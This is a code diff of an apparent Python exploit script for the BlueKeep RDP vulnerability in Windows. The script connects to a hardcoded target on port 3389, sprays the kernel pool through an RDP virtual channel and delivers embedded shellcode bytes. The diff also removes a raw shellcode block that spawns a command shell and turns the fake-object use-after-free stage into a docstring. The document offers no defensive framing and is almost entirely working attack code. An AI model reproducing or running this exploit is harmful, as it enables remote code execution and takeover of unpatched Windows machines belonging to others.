@@ -3,18 +3,17 @@ import socket
 import binascii
 import time
 
-
 def pool_spray(s, crypter, payload):
 
     times = 10000
     count = 0
 
-    while count < times:
+    while count < times: 
 
-        count += 1
+        count += 1 
         #print('time through %d' % count)
 
-        try:
+        try: 
 
             s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, payload))
 
@@ -24,11 +23,9 @@ def pool_spray(s, crypter, payload):
 
             quit()
 
-
 def main():
+    print("次数：8")
 
-
-    print("正在使用新代码 直接上传 7")
     # change to your target
     host = '192.168.1.106'
     port = 3389
@@ -38,7 +35,6 @@ def main():
 
     target = (host, port)
 
-    # 开启sokect，并连接
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(target)
 
@@ -51,7 +47,7 @@ def main():
     shellcode_address = b'\x28\xf0\x4f\x87'
 
     # replace buf with your shellcode
-    buf = b""
+    buf =  b""
     buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
     buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
     buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
@@ -77,6 +73,7 @@ def main():
     buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
     buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
     buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
+
 
     # bluekeep_kshellcode_x86.asm
     # ring 0 to ring 3 shellcode
@@ -138,80 +135,47 @@ def main():
 
     shellcode += buf
 
-    ##################打开cmd#######################
-    outCode = b""
-    outCode += b"\xEB\x60\x55\x8B\xEC\x64\xA1\x30"
-    outCode += b"\x00\x00\x00\x8B\x40\x0C\x8B\x40"
-    outCode += b"\x14\x8B\x00\x8B\x70\x28\x80\x7E"
-    outCode += b"\x0C\x33\x75\xF5\x8B\x40\x10\x8B"
-    outCode += b"\xF8\x03\x7F\x3C\x8B\x7F\x78\x03"
-    outCode += b"\xF8\x8B\xDF\x8B\x7B\x20\x03\xF8"
-    outCode += b"\x33\xC9\x39\x4C\x24\x08\xB9\x47"
-    outCode += b"\x02\x00\x00\x74\x05\xB9\x3E\x03"
-    outCode += b"\x00\x00\x8B\x7B\x24\x03\xF8\x8B"
-    outCode += b"\x0C\x4F\x81\xE1\xFF\xFF\x00\x00"
-    outCode += b"\x8B\x7B\x1C\x03\xF8\x49\xC1\xE1"
-    outCode += b"\x02\x8B\x3C\x0F\x03\xC7\x5D\xC2"
-    outCode += b"\x08\x00\x68\x72\x6F\x63\x41\x6A"
-    outCode += b"\x00\xE8\x94\xFF\xFF\xFF\x50\x68"
-    outCode += b"\x4C\x69\x62\x72\x68\x4C\x6F\x61"
-    outCode += b"\x64\xE8\x84\xFF\xFF\xFF\x50\x68"
-    outCode += b"\x72\x74\x00\x00\x68\x6D\x73\x76"
-    outCode += b"\x63\x54\xFF\xD0\x83\xC4\x08\x68"
-    outCode += b"\x65\x6D\x00\x00\x68\x73\x79\x73"
-    outCode += b"\x74\x54\x50\xFF\x54\x24\x14\x83"
-    outCode += b"\xC4\x08\x68\x63\x6D\x64\x00\x54"
-    outCode += b"\xFF\xD0"
-    #############################################
-
-    s.sendall(outCode)
-
     print('shellcode len: %d' % len(shellcode))
 
     payload_size = 1600
     payload = b'\x2c\xf0\x4f\x87' + shellcode
     payload = payload + b'\x5a' * (payload_size - len(payload))
 
-    # payload_size = 1600
-    # payload = b'\x2c\xf0\x4f\x87' + outCode
-    # payload = payload + b'\x5a' * (payload_size - len(payload))
-    # payload 攻击汇编语句 用于建立连接
-    # crypter 建立连接后返回的结构体
-    # fake_obj 攻击汇编语句 用于蓝屏
+
     print('[+] spraying pool')
     pool_spray(s, crypter, payload)
-    # pool_spray(s, crypter, outCode)
 
-    ###################################################
+    ######################################################
 
-    # fake_obj_size = 168
-    # call_offset = 108
-    # fake_obj = b'\x00'*call_offset + shellcode_address
-    # fake_obj = fake_obj + b'\x00' * (fake_obj_size - len(fake_obj))
+    """
 
-    # time.sleep(.5)
-    # print('[+] sending free')
-    # s.sendall(rdp.free_32(crypter))
-    # time.sleep(.15)
+    fake_obj_size = 168
+    call_offset = 108
+    fake_obj = b'\x00'*call_offset + shellcode_address
+    fake_obj =  fake_obj + b'\x00' * (fake_obj_size - len(fake_obj)) 
 
-    # print('[+] allocating fake objects')
-    # while count < times:
+    time.sleep(.5)
+    print('[+] sending free')
+    s.sendall(rdp.free_32(crypter))
+    time.sleep(.15)
 
-    #     count += 1
-    #     #print('time through %d' % count)
+    print('[+] allocating fake objects')
+    while count < times:
+        
+        count += 1 
+        #print('time through %d' % count)
 
-    #     try:
+        try: 
 
-    #         # s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, fake_obj))
-    #         # s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, outCode))
-    #         s.sendall(outCode)
+            s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, fake_obj))
 
-    #     except ConnectionResetError:
+        except ConnectionResetError:
 
-    #         s.close()
+            s.close()
 
+    """
     s.close()
 
 
-if __name__ == "__main__":
+if __name__== "__main__":
     main()
